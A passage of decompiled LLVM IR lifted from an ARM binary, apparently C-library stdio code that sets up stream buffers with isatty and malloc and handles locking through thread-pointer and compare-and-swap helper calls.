  %v1_15ba0 = icmp slt i32 %v2_15b9c, 0
  %v1_15ba4 = load i32, i32* @r5, align 4
  %v2_15ba4 = add i32 %v1_15ba4, 4
  %v3_15ba4 = inttoptr i32 %v2_15ba4 to i32*
  store i32 %v2_15b9c, i32* %v3_15ba4, align 4
  br i1 %v1_15ba0, label %dec_label_pc_15ab0, label %.dec_label_pc_15bac_crit_edge

.dec_label_pc_15bac_crit_edge:                    ; preds = %dec_label_pc_15b88._crit_edge
  %v0_15bb0.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_15bac

dec_label_pc_15bac:                               ; preds = %.dec_label_pc_15bac_crit_edge, %dec_label_pc_15b7c
  %v0_15bc8 = phi i32 [ %v0_15bb0.pre, %.dec_label_pc_15bac_crit_edge ], [ %v2_15b80, %dec_label_pc_15b7c ]
  %v0_15bac = load i32, i32* @r5, align 4
  %v1_15bac = inttoptr i32 %v0_15bac to i16*
  %v2_15bac = load i16, i16* %v1_15bac, align 2
  %v3_15bac = zext i16 %v2_15bac to i32
  %v1_15bb0 = urem i32 %v0_15bc8, 4
  %v1_15bb4 = and i32 %v0_15bc8, 1024
  %v1_15bb8 = and i32 %v3_15bac, 8192
  %v1_15bbc = add nuw nsw i32 %v1_15bb0, 1
  %v2_15bc0 = or i32 %v1_15bb8, %v1_15bb4
  store i32 %v2_15bc0, i32* %r3.global-to-local, align 4
  %v1_15bc4 = xor i32 %v1_15bbc, 3
  %v1_15bc8 = and i32 %v0_15bc8, 131072
  store i32 %v1_15bc8, i32* %r2.global-to-local, align 4
  %v2_15bc8 = icmp eq i32 %v1_15bc8, 0
  %v1_15bcc = add i32 %v0_15bac, 4
  %v2_15bcc = inttoptr i32 %v1_15bcc to i32*
  %v3_15bcc = load i32, i32* %v2_15bcc, align 4
  store i32 %v3_15bcc, i32* @r4, align 4
  br i1 %v2_15bc8, label %bb55, label %bb54

bb54:                                             ; preds = %dec_label_pc_15bac
  store i32 32768, i32* %r2.global-to-local, align 4
  br label %bb55

bb55:                                             ; preds = %dec_label_pc_15bac, %bb54
  %v0_15bd8 = phi i32 [ 0, %dec_label_pc_15bac ], [ 32768, %bb54 ]
  %v4_15bd4 = mul nuw nsw i32 %v1_15bc4, 16
  %v5_15bd4 = or i32 %v2_15bc0, %v4_15bd4
  store i32 %v5_15bd4, i32* %r3.global-to-local, align 4
  %v2_15bd8 = or i32 %v0_15bd8, %v5_15bd4
  store i32 %v2_15bd8, i32* %r2.global-to-local, align 4
  %v2_15bdc = icmp ugt i32 %v3_15bcc, 2147483646
  store i1 %v2_15bdc, i1* %cpsr_c.global-to-local, align 1
  %v8_15bdc = icmp eq i32 %v3_15bcc, 2147483647
  %v1_15be0 = trunc i32 %v2_15bd8 to i16
  store i16 %v1_15be0, i16* %v1_15bac, align 2
  br i1 %v8_15bdc, label %dec_label_pc_15c20, label %dec_label_pc_15be8

dec_label_pc_15be8:                               ; preds = %bb55
  store i32 48704, i32* %r3.global-to-local, align 4
  %v0_15bec = call i32 @__aeabi_read_tp()
  %v3_15bf0 = load i16, i16* @global_var_21a38.351, align 2
  %v4_15bf0 = sext i16 %v3_15bf0 to i32
  store i32 %v4_15bf0, i32* @r3, align 4
  store i32 %v0_15bec, i32* @r6, align 4
  %v0_15bf8 = load i32, i32* @r4, align 4
  store i32 %v0_15bf8, i32* @r0, align 4
  %v2_15bfc = add i32 %v4_15bf0, %v0_15bec
  %v3_15bfc = inttoptr i32 %v2_15bfc to i32*
  %v4_15bfc = load i32, i32* %v3_15bfc, align 4
  store i32 %v4_15bfc, i32* @r4, align 4
  %v1_15c00 = call i32 @isatty(i32 %v0_15bf8)
  store i32 %v1_15c00, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_15c04 = icmp eq i32 %v1_15c00, 0
  br i1 %v2_15c04, label %.thread5, label %bb56

bb56:                                             ; preds = %dec_label_pc_15be8
  %v1_15c08 = load i32, i32* @r5, align 4
  %v2_15c08 = inttoptr i32 %v1_15c08 to i16*
  %v3_15c08 = load i16, i16* %v2_15c08, align 2
  %v4_15c08 = zext i16 %v3_15c08 to i32
  %v2_15c0c = or i32 %v4_15c08, 256
  store i32 %v2_15c0c, i32* %r3.global-to-local, align 4
  %v2_15c10 = trunc i32 %v2_15c0c to i16
  store i16 %v2_15c10, i16* %v2_15c08, align 2
  br label %.thread5

.thread5:                                         ; preds = %dec_label_pc_15be8, %bb56
  %v3_15c18 = load i16, i16* @global_var_21a38.351, align 2
  %v4_15c18 = sext i16 %v3_15c18 to i32
  store i32 %v4_15c18, i32* %r3.global-to-local, align 4
  %v0_15c1c = load i32, i32* @r4, align 4
  %v1_15c1c = load i32, i32* @r6, align 4
  %v3_15c1c = add i32 %v1_15c1c, %v4_15c18
  %v4_15c1c = inttoptr i32 %v3_15c1c to i32*
  store i32 %v0_15c1c, i32* %v4_15c1c, align 4
  br label %dec_label_pc_15c20

dec_label_pc_15c20:                               ; preds = %bb55, %.thread5
  %v0_15c20 = load i32, i32* @r5, align 4
  %v1_15c20 = add i32 %v0_15c20, 8
  %v2_15c20 = inttoptr i32 %v1_15c20 to i32*
  %v3_15c20 = load i32, i32* %v2_15c20, align 4
  store i32 %v3_15c20, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_15c24 = icmp eq i32 %v3_15c20, 0
  br i1 %v2_15c24, label %dec_label_pc_15c2c, label %bb57

dec_label_pc_15c2c:                               ; preds = %dec_label_pc_15c20
  store i32 4096, i32* @r0, align 4
  %v0_15c30 = call i32 @malloc()
  store i32 %v0_15c30, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_15c34 = icmp eq i32 %v0_15c30, 0
  %v1_15c44.pre = load i32, i32* @r5, align 4
  br i1 %v2_15c34, label %.thread9, label %.thread8

.thread8:                                         ; preds = %dec_label_pc_15c2c
  %v2_15c38 = inttoptr i32 %v1_15c44.pre to i16*
  %v3_15c38 = load i16, i16* %v2_15c38, align 2
  %v4_15c38 = zext i16 %v3_15c38 to i32
  %v2_15c3c = add i32 %v0_15c30, 4096
  store i32 %v2_15c3c, i32* %r2.global-to-local, align 4
  %v2_15c40 = or i32 %v4_15c38, 16384
  store i32 %v2_15c40, i32* %r3.global-to-local, align 4
  %v2_15c44 = add i32 %v1_15c44.pre, 8
  %v3_15c44 = inttoptr i32 %v2_15c44 to i32*
  store i32 %v0_15c30, i32* %v3_15c44, align 4
  %v1_15c48 = load i32, i32* %r2.global-to-local, align 4
  %v2_15c48 = load i32, i32* @r5, align 4
  %v3_15c48 = add i32 %v2_15c48, 12
  %v4_15c48 = inttoptr i32 %v3_15c48 to i32*
  store i32 %v1_15c48, i32* %v4_15c48, align 4
  %v1_15c4c = load i32, i32* %r3.global-to-local, align 4
  %v2_15c4c = trunc i32 %v1_15c4c to i16
  %v3_15c4c = load i32, i32* @r5, align 4
  %v4_15c4c = inttoptr i32 %v3_15c4c to i16*
  store i16 %v2_15c4c, i16* %v4_15c4c, align 2
  br label %bb57

.thread9:                                         ; preds = %dec_label_pc_15c2c
  %v2_15c4437 = add i32 %v1_15c44.pre, 8
  %v3_15c4438 = inttoptr i32 %v2_15c4437 to i32*
  store i32 0, i32* %v3_15c4438, align 4
  %v2_15c50 = load i32, i32* @r5, align 4
  %v3_15c50 = add i32 %v2_15c50, 12
  %v4_15c50 = inttoptr i32 %v3_15c50 to i32*
  store i32 0, i32* %v4_15c50, align 4
  br label %bb57

bb57:                                             ; preds = %.thread8, %dec_label_pc_15c20, %.thread9
  store i32 92, i32* %r3.global-to-local, align 4
  store i32 0, i32* %r4.global-to-local, align 4
  %v0_15c5c = load i32, i32* @r8, align 4
  %v2_15c5c = add i32 %v0_15c5c, 92
  %v3_15c5c = inttoptr i32 %v2_15c5c to i32*
  %v4_15c5c = load i32, i32* %v3_15c5c, align 4
  store i32 %v4_15c5c, i32* %r3.global-to-local, align 4
  %v2_15c60 = load i32, i32* @r5, align 4
  %v3_15c60 = add i32 %v2_15c60, 2
  %v4_15c60 = inttoptr i32 %v3_15c60 to i8*
  store i8 0, i8* %v4_15c60, align 1
  %v0_15c64 = load i32, i32* @r5, align 4
  %v1_15c64 = inttoptr i32 %v0_15c64 to i16*
  %v2_15c64 = load i16, i16* %v1_15c64, align 2
  %v3_15c64 = zext i16 %v2_15c64 to i32
  store i32 %v3_15c64, i32* %r2.global-to-local, align 4
  %v0_15c68 = load i32, i32* %r3.global-to-local, align 4
  %v1_15c68 = inttoptr i32 %v0_15c68 to i32*
  %v2_15c68 = load i32, i32* %v1_15c68, align 4
  store i32 %v2_15c68, i32* @r1, align 4
  %v1_15c6c = add i32 %v0_15c64, 8
  %v2_15c6c = inttoptr i32 %v1_15c6c to i32*
  %v3_15c6c = load i32, i32* %v2_15c6c, align 4
  store i32 %v3_15c6c, i32* %r3.global-to-local, align 4
  %v1_15c70 = and i32 %v3_15c64, 8192
  %v2_15c70 = icmp eq i32 %v1_15c70, 0
  %v2_15c74 = add i32 %v0_15c64, 20
  %v3_15c74 = inttoptr i32 %v2_15c74 to i32*
  store i32 %v3_15c6c, i32* %v3_15c74, align 4
  %v0_15c78 = load i32, i32* @r1, align 4
  %v1_15c78 = load i32, i32* @r5, align 4
  %v2_15c78 = add i32 %v1_15c78, 52
  %v3_15c78 = inttoptr i32 %v2_15c78 to i32*
  store i32 %v0_15c78, i32* %v3_15c78, align 4
  %v0_15c7c = load i32, i32* %r3.global-to-local, align 4
  %v1_15c7c = load i32, i32* @r5, align 4
  %v2_15c7c = add i32 %v1_15c7c, 24
  %v3_15c7c = inttoptr i32 %v2_15c7c to i32*
  store i32 %v0_15c7c, i32* %v3_15c7c, align 4
  %v0_15c80 = load i32, i32* %r3.global-to-local, align 4
  %v1_15c80 = load i32, i32* @r5, align 4
  %v2_15c80 = add i32 %v1_15c80, 28
  %v3_15c80 = inttoptr i32 %v2_15c80 to i32*
  store i32 %v0_15c80, i32* %v3_15c80, align 4
  %v0_15c84 = load i32, i32* %r3.global-to-local, align 4
  %v1_15c84 = load i32, i32* @r5, align 4
  %v2_15c84 = add i32 %v1_15c84, 16
  %v3_15c84 = inttoptr i32 %v2_15c84 to i32*
  store i32 %v0_15c84, i32* %v3_15c84, align 4
  %v0_15c88 = load i32, i32* %r4.global-to-local, align 4
  %v1_15c88 = load i32, i32* @r5, align 4
  %v2_15c88 = add i32 %v1_15c88, 44
  %v3_15c88 = inttoptr i32 %v2_15c88 to i32*
  store i32 %v0_15c88, i32* %v3_15c88, align 4
  br i1 %v2_15c70, label %dec_label_pc_15e70, label %dec_label_pc_15c90

dec_label_pc_15c90:                               ; preds = %bb57
  store i32 160, i32* %r3.global-to-local, align 4
  %v0_15c94 = load i32, i32* @r8, align 4
  %v2_15c94 = add i32 %v0_15c94, 160
  %v3_15c94 = inttoptr i32 %v2_15c94 to i32*
  %v4_15c94 = load i32, i32* %v3_15c94, align 4
  store i32 %v4_15c94, i32* %r7.global-to-local, align 4
  %v0_15c98 = call i32 @__aeabi_read_tp()
  store i32 %v0_15c98, i32* %r0.global-to-local, align 4
  %v1_15c9c = add i32 %v4_15c94, 8
  %v2_15c9c = inttoptr i32 %v1_15c9c to i32*
  %v3_15c9c = load i32, i32* %v2_15c9c, align 4
  store i32 %v3_15c9c, i32* %r3.global-to-local, align 4
  %v1_15ca0 = add i32 %v0_15c98, -1168
  store i32 %v1_15ca0, i32* %r6.global-to-local, align 4
  %v3_15ca4 = icmp uge i32 %v3_15c9c, %v1_15ca0
  store i1 %v3_15ca4, i1* %cpsr_c.global-to-local, align 1
  %v9_15ca4 = icmp eq i32 %v3_15c9c, %v1_15ca0
  br i1 %v9_15ca4, label %dec_label_pc_15ce8, label %dec_label_pc_15cac

dec_label_pc_15cac:                               ; preds = %dec_label_pc_15c90
  store i32 %v4_15c94, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_15cb4

dec_label_pc_15cb4:                               ; preds = %dec_label_pc_15cc0.dec_label_pc_15cb4_crit_edge, %dec_label_pc_15cac
  %v0_15cb4 = phi i32 [ %v0_15cb4.pre, %dec_label_pc_15cc0.dec_label_pc_15cb4_crit_edge ], [ %v4_15c94, %dec_label_pc_15cac ]
  %v1_15cb4 = inttoptr i32 %v0_15cb4 to i32*
  %v2_15cb4 = load i32, i32* %v1_15cb4, align 4
  store i32 %v2_15cb4, i32* %r3.global-to-local, align 4
  %v1_15cb8 = load i32, i32* %r4.global-to-local, align 4
  %v3_15cb8 = icmp uge i32 %v2_15cb4, %v1_15cb8
  store i1 %v3_15cb8, i1* %cpsr_c.global-to-local, align 1
  %v9_15cb8 = icmp eq i32 %v2_15cb4, %v1_15cb8
  br i1 %v9_15cb8, label %dec_label_pc_15cc0, label %dec_label_pc_15cd8

dec_label_pc_15cc0:                               ; preds = %dec_label_pc_15cb4
  store i32 %v2_15cb4, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_15cd0 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_15cd0, label %dec_label_pc_15cd4, label %dec_label_pc_15cc0.dec_label_pc_15cb4_crit_edge

dec_label_pc_15cc0.dec_label_pc_15cb4_crit_edge:  ; preds = %dec_label_pc_15cc0
  %v0_15cb4.pre = load i32, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_15cb4

dec_label_pc_15cd4:                               ; preds = %dec_label_pc_15cc0
  %v0_15cd4 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_15cd4, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_15cd8

dec_label_pc_15cd8:                               ; preds = %dec_label_pc_15cb4, %dec_label_pc_15cd4
  %v0_15cd8 = phi i32 [ %v0_15cd4, %dec_label_pc_15cd4 ], [ %v2_15cb4, %dec_label_pc_15cb4 ]
  %v1_15cd8 = phi i32 [ %v0_15cd4, %dec_label_pc_15cd4 ], [ %v1_15cb8, %dec_label_pc_15cb4 ]
  %v3_15cd8 = icmp uge i32 %v0_15cd8, %v1_15cd8
  store i1 %v3_15cd8, i1* %cpsr_c.global-to-local, align 1
  %v9_15cd8 = icmp eq i32 %v0_15cd8, %v1_15cd8
  br i1 %v9_15cd8, label %bb59, label %bb58

bb58:                                             ; preds = %dec_label_pc_15cd8
  %v1_15cdc = load i32, i32* %r7.global-to-local, align 4
  store i32 %v1_15cdc, i32* %r0.global-to-local, align 4
  br label %bb59

bb59:                                             ; preds = %dec_label_pc_15cd8, %bb58
  %v1_15ce0 = xor i1 %v9_15cd8, true
  call void @__pseudo_cond_branch(i1 %v1_15ce0, i32 ptrtoint (i32* @global_var_13f34.514 to i32))
  %v0_15ce4 = load i32, i32* %r6.global-to-local, align 4
  %v1_15ce4 = load i32, i32* %r7.global-to-local, align 4
  %v2_15ce4 = add i32 %v1_15ce4, 8
  %v3_15ce4 = inttoptr i32 %v2_15ce4 to i32*
  store i32 %v0_15ce4, i32* %v3_15ce4, align 4
  %v1_15d04.pre = load i32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_15ce8

dec_label_pc_15ce8:                               ; preds = %dec_label_pc_15c90, %bb59
  %v1_15d04 = phi i32 [ %v3_15c9c, %dec_label_pc_15c90 ], [ %v1_15d04.pre, %bb59 ]
  store i32 160, i32* %r3.global-to-local, align 4
  %v0_15cec = load i32, i32* @r8, align 4
  %v2_15cec = add i32 %v0_15cec, 160
  %v3_15cec = inttoptr i32 %v2_15cec to i32*
  %v4_15cec = load i32, i32* %v3_15cec, align 4
  store i32 152, i32* %r3.global-to-local, align 4
  %v2_15cf4 = add i32 %v0_15cec, 152
  %v3_15cf4 = inttoptr i32 %v2_15cf4 to i32*
  %v4_15cf4 = load i32, i32* %v3_15cf4, align 4
  store i32 %v4_15cf4, i32* %r7.global-to-local, align 4
  %v1_15cf8 = add i32 %v4_15cec, 4
  %v2_15cf8 = inttoptr i32 %v1_15cf8 to i32*
  %v3_15cf8 = load i32, i32* %v2_15cf8, align 4
  store i32 %v3_15cf8, i32* %r3.global-to-local, align 4
  %v1_15cfc = add i32 %v4_15cf4, 8
  %v2_15cfc = inttoptr i32 %v1_15cfc to i32*
  %v3_15cfc = load i32, i32* %v2_15cfc, align 4
  store i32 %v3_15cfc, i32* %r2.global-to-local, align 4
  %v1_15d00 = add i32 %v3_15cf8, 1
  store i32 %v1_15d00, i32* %r3.global-to-local, align 4
  %v3_15d04 = icmp uge i32 %v3_15cfc, %v1_15d04
  store i1 %v3_15d04, i1* %cpsr_c.global-to-local, align 1
  %v9_15d04 = icmp eq i32 %v3_15cfc, %v1_15d04
  store i32 %v1_15d00, i32* %v2_15cf8, align 4
  br i1 %v9_15d04, label %dec_label_pc_15d50, label %dec_label_pc_15d10

dec_label_pc_15d10:                               ; preds = %dec_label_pc_15ce8
  %v0_15d14 = load i32, i32* %r7.global-to-local, align 4
  store i32 %v0_15d14, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r4.global-to-local, align 4
  %v1_15d1c95 = inttoptr i32 %v0_15d14 to i32*
  %v2_15d1c96 = load i32, i32* %v1_15d1c95, align 4
  store i32 %v2_15d1c96, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v9_15d2098 = icmp eq i32 %v2_15d1c96, 0
  br i1 %v9_15d2098, label %dec_label_pc_15d28, label %dec_label_pc_15d40

dec_label_pc_15d28:                               ; preds = %dec_label_pc_15d10, %dec_label_pc_15d28.dec_label_pc_15d1c_crit_edge
  %v0_15d2899 = phi i32 [ %v1_15d20.pre, %dec_label_pc_15d28.dec_label_pc_15d1c_crit_edge ], [ 0, %dec_label_pc_15d10 ]
  store i32 %v0_15d2899, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_15d38 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_15d38, label %dec_label_pc_15d3c, label %dec_label_pc_15d28.dec_label_pc_15d1c_crit_edge

dec_label_pc_15d28.dec_label_pc_15d1c_crit_edge:  ; preds = %dec_label_pc_15d28
  %v0_15d1c.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_15d20.pre = load i32, i32* %r4.global-to-local, align 4
  %v1_15d1c = inttoptr i32 %v0_15d1c.pre to i32*
  %v2_15d1c = load i32, i32* %v1_15d1c, align 4
  store i32 %v2_15d1c, i32* %r3.global-to-local, align 4
  %v3_15d20 = icmp uge i32 %v2_15d1c, %v1_15d20.pre
  store i1 %v3_15d20, i1* %cpsr_c.global-to-local, align 1
  %v9_15d20 = icmp eq i32 %v2_15d1c, %v1_15d20.pre
  br i1 %v9_15d20, label %dec_label_pc_15d28, label %dec_label_pc_15d40

dec_label_pc_15d3c:                               ; preds = %dec_label_pc_15d28
  %v0_15d3c = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_15d3c, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_15d40

dec_label_pc_15d40:                               ; preds = %dec_label_pc_15d10, %dec_label_pc_15d28.dec_label_pc_15d1c_crit_edge, %dec_label_pc_15d3c
  %v0_15d40 = phi i32 [ %v0_15d3c, %dec_label_pc_15d3c ], [ %v2_15d1c96, %dec_label_pc_15d10 ], [ %v2_15d1c, %dec_label_pc_15d28.dec_label_pc_15d1c_crit_edge ]
  %v1_15d40 = phi i32 [ %v0_15d3c, %dec_label_pc_15d3c ], [ 0, %dec_label_pc_15d10 ], [ %v1_15d20.pre, %dec_label_pc_15d28.dec_label_pc_15d1c_crit_edge ]
  %v3_15d40 = icmp uge i32 %v0_15d40, %v1_15d40
  store i1 %v3_15d40, i1* %cpsr_c.global-to-local, align 1
  %v9_15d40 = icmp eq i32 %v0_15d40, %v1_15d40
  br i1 %v9_15d40, label %bb61, label %bb60

bb60:                                             ; preds = %dec_label_pc_15d40
  %v1_15d44 = load i32, i32* %r7.global-to-local, align 4
  store i32 %v1_15d44, i32* %r0.global-to-local, align 4
  br label %bb61

bb61:                                             ; preds = %dec_label_pc_15d40, %bb60
  %v1_15d48 = xor i1 %v9_15d40, true
  call void @__pseudo_cond_branch(i1 %v1_15d48, i32 ptrtoint (i32* @global_var_13f34.514 to i32))
  %v0_15d4c = load i32, i32* %r6.global-to-local, align 4
  %v1_15d4c = load i32, i32* %r7.global-to-local, align 4
  %v2_15d4c = add i32 %v1_15d4c, 8
  %v3_15d4c = inttoptr i32 %v2_15d4c to i32*
  store i32 %v0_15d4c, i32* %v3_15d4c, align 4
  br label %dec_label_pc_15d50

dec_label_pc_15d50:                               ; preds = %dec_label_pc_15ce8, %bb61
  store i32 152, i32* %r3.global-to-local, align 4
  %v0_15d54 = load i32, i32* @r8, align 4
  %v2_15d54 = add i32 %v0_15d54, 152
  %v3_15d54 = inttoptr i32 %v2_15d54 to i32*
  %v4_15d54 = load i32, i32* %v3_15d54, align 4
  store i32 %v4_15d54, i32* %r0.global-to-local, align 4
  store i32 76, i32* %r3.global-to-local, align 4
  %v2_15d5c = add i32 %v0_15d54, 76
  %v3_15d5c = inttoptr i32 %v2_15d5c to i32*
  %v4_15d5c = load i32, i32* %v3_15d5c, align 4
  store i32 %v4_15d5c, i32* @r1, align 4
  %v1_15d60 = add i32 %v4_15d54, 4
  %v2_15d60 = inttoptr i32 %v1_15d60 to i32*
  %v3_15d60 = load i32, i32* %v2_15d60, align 4
  store i32 %v3_15d60, i32* %r3.global-to-local, align 4
  %v1_15d64 = inttoptr i32 %v4_15d5c to i32*
  %v2_15d64 = load i32, i32* %v1_15d64, align 4
  store i32 %v2_15d64, i32* %r2.global-to-local, align 4
  %v1_15d68 = add i32 %v3_15d60, 1
  store i32 %v1_15d68, i32* %r3.global-to-local, align 4
  store i32 %v1_15d68, i32* %v2_15d60, align 4
  %v0_15d70 = load i32, i32* %r2.global-to-local, align 4
  %v1_15d70 = load i32, i32* @r5, align 4
  %v2_15d70 = add i32 %v1_15d70, 32
  %v3_15d70 = inttoptr i32 %v2_15d70 to i32*
  store i32 %v0_15d70, i32* %v3_15d70, align 4
  %v0_15d74 = load i32, i32* %r0.global-to-local, align 4
  %v1_15d74 = add i32 %v0_15d74, 4
  %v2_15d74 = inttoptr i32 %v1_15d74 to i32*
  %v3_15d74 = load i32, i32* %v2_15d74, align 4
  %v1_15d78 = add i32 %v3_15d74, -1
  store i32 %v1_15d78, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_15d7c = icmp eq i32 %v1_15d78, 0
  %v0_15d80 = load i32, i32* @r5, align 4
  %v1_15d80 = load i32, i32* @r1, align 4
  %v2_15d80 = inttoptr i32 %v1_15d80 to i32*
  store i32 %v0_15d80, i32* %v2_15d80, align 4
  %v0_15d84 = load i32, i32* %r3.global-to-local, align 4
  %v1_15d84 = load i32, i32* %r0.global-to-local, align 4
  %v2_15d84 = add i32 %v1_15d84, 4
  %v3_15d84 = inttoptr i32 %v2_15d84 to i32*
  store i32 %v0_15d84, i32* %v3_15d84, align 4
  br i1 %v2_15d7c, label %dec_label_pc_15d8c, label %dec_label_pc_15dec

dec_label_pc_15d8c:                               ; preds = %dec_label_pc_15d50
  %v0_15d8c = load i32, i32* %r3.global-to-local, align 4
  %v1_15d8c = load i32, i32* %r0.global-to-local, align 4
  %v2_15d8c = add i32 %v1_15d8c, 8
  %v3_15d8c = inttoptr i32 %v2_15d8c to i32*
  store i32 %v0_15d8c, i32* %v3_15d8c, align 4
  %v0_15d90 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_15d90, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_15d94

dec_label_pc_15d94:                               ; preds = %dec_label_pc_15dc4.dec_label_pc_15d94_crit_edge, %dec_label_pc_15d8c
  %v0_15d94 = phi i32 [ %v0_15d94.pre, %dec_label_pc_15dc4.dec_label_pc_15d94_crit_edge ], [ %v0_15d90, %dec_label_pc_15d8c ]
  %v1_15d94 = inttoptr i32 %v0_15d94 to i32*
  %v2_15d94 = load i32, i32* %v1_15d94, align 4
  store i32 %v2_15d94, i32* %r4.global-to-local, align 4
  store i32 0, i32* @r1, align 4
  store i32 %v0_15d94, i32* %r2.global-to-local, align 4
  %v2_15da083 = load i32, i32* %v1_15d94, align 4
  store i32 %v2_15da083, i32* %r3.global-to-local, align 4
  %v3_15da485 = icmp uge i32 %v2_15da083, %v2_15d94
  store i1 %v3_15da485, i1* %cpsr_c.global-to-local, align 1
  %v9_15da491 = icmp eq i32 %v2_15da083, %v2_15d94
  br i1 %v9_15da491, label %dec_label_pc_15dac, label %dec_label_pc_15dc4

dec_label_pc_15dac:                               ; preds = %dec_label_pc_15d94, %dec_label_pc_15dac.dec_label_pc_15da0_crit_edge
  %v0_15dac92 = phi i32 [ %v1_15da4.pre, %dec_label_pc_15dac.dec_label_pc_15da0_crit_edge ], [ %v2_15d94, %dec_label_pc_15d94 ]
  store i32 %v0_15dac92, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_15dbc = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_15dbc, label %dec_label_pc_15dc0, label %dec_label_pc_15dac.dec_label_pc_15da0_crit_edge

dec_label_pc_15dac.dec_label_pc_15da0_crit_edge:  ; preds = %dec_label_pc_15dac
  %v0_15da0.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_15da4.pre = load i32, i32* %r4.global-to-local, align 4
  %v1_15da0 = inttoptr i32 %v0_15da0.pre to i32*
  %v2_15da0 = load i32, i32* %v1_15da0, align 4
  store i32 %v2_15da0, i32* %r3.global-to-local, align 4
  %v3_15da4 = icmp uge i32 %v2_15da0, %v1_15da4.pre
  store i1 %v3_15da4, i1* %cpsr_c.global-to-local, align 1
  %v9_15da4 = icmp eq i32 %v2_15da0, %v1_15da4.pre
  br i1 %v9_15da4, label %dec_label_pc_15dac, label %dec_label_pc_15dc4

dec_label_pc_15dc0:                               ; preds = %dec_label_pc_15dac
  %v0_15dc0 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_15dc0, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_15dc4

dec_label_pc_15dc4:                               ; preds = %dec_label_pc_15d94, %dec_label_pc_15dac.dec_label_pc_15da0_crit_edge, %dec_label_pc_15dc0
  %v0_15dcc = phi i32 [ %v0_15dc0, %dec_label_pc_15dc0 ], [ %v2_15da083, %dec_label_pc_15d94 ], [ %v2_15da0, %dec_label_pc_15dac.dec_label_pc_15da0_crit_edge ]
  %v1_15dc4 = phi i32 [ %v0_15dc0, %dec_label_pc_15dc0 ], [ %v2_15d94, %dec_label_pc_15d94 ], [ %v1_15da4.pre, %dec_label_pc_15dac.dec_label_pc_15da0_crit_edge ]
  %v3_15dc4 = icmp uge i32 %v0_15dcc, %v1_15dc4
  store i1 %v3_15dc4, i1* %cpsr_c.global-to-local, align 1
  %v9_15dc4 = icmp eq i32 %v0_15dcc, %v1_15dc4
  br i1 %v9_15dc4, label %dec_label_pc_15dcc, label %dec_label_pc_15dc4.dec_label_pc_15d94_crit_edge

dec_label_pc_15dc4.dec_label_pc_15d94_crit_edge:  ; preds = %dec_label_pc_15dc4
  %v0_15d94.pre = load i32, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_15d94

dec_label_pc_15dcc:                               ; preds = %dec_label_pc_15dc4
  %v2_15dcc = icmp ne i32 %v1_15dc4, 0
  store i1 %v2_15dcc, i1* %cpsr_c.global-to-local, align 1
  %v7_15dd0 = icmp slt i32 %v1_15dc4, 2
  br i1 %v7_15dd0, label %dec_label_pc_15dec, label %dec_label_pc_15dd4

dec_label_pc_15dd4:                               ; preds = %dec_label_pc_15dcc
  %v0_15dd4 = load i32, i32* %r7.global-to-local, align 4
  store i32 %v0_15dd4, i32* %r0.global-to-local, align 4
  %v0_15dd8 = load i32, i32* @r1, align 4
  %v1_15dd8 = add i32 %v0_15dd8, 129
  store i32 %v1_15dd8, i32* @r1, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 240, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_15dec

dec_label_pc_15dec:                               ; preds = %dec_label_pc_15d50, %dec_label_pc_15dd4, %dec_label_pc_15dcc
  store i32 160, i32* %r3.global-to-local, align 4
  %v0_15df0 = load i32, i32* @r8, align 4
  %v2_15df0 = add i32 %v0_15df0, 160
  %v3_15df0 = inttoptr i32 %v2_15df0 to i32*
  %v4_15df0 = load i32, i32* %v3_15df0, align 4
  store i32 %v4_15df0, i32* %r0.global-to-local, align 4
  %v1_15df4 = add i32 %v4_15df0, 4
  %v2_15df4 = inttoptr i32 %v1_15df4 to i32*
  %v3_15df4 = load i32, i32* %v2_15df4, align 4
  %v1_15df8 = add i32 %v3_15df4, -1
  store i32 %v1_15df8, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_15dfc = icmp eq i32 %v1_15df8, 0
  store i32 %v1_15df8, i32* %v2_15df4, align 4
  br i1 %v2_15dfc, label %dec_label_pc_15e08, label %dec_label_pc_15e70

dec_label_pc_15e08:                               ; preds = %dec_label_pc_15dec
  %v0_15e08 = load i32, i32* %r3.global-to-local, align 4
  %v1_15e08 = load i32, i32* %r0.global-to-local, align 4
  %v2_15e08 = add i32 %v1_15e08, 8
  %v3_15e08 = inttoptr i32 %v2_15e08 to i32*
  store i32 %v0_15e08, i32* %v3_15e08, align 4
  %v0_15e0c = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_15e0c, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_15e10

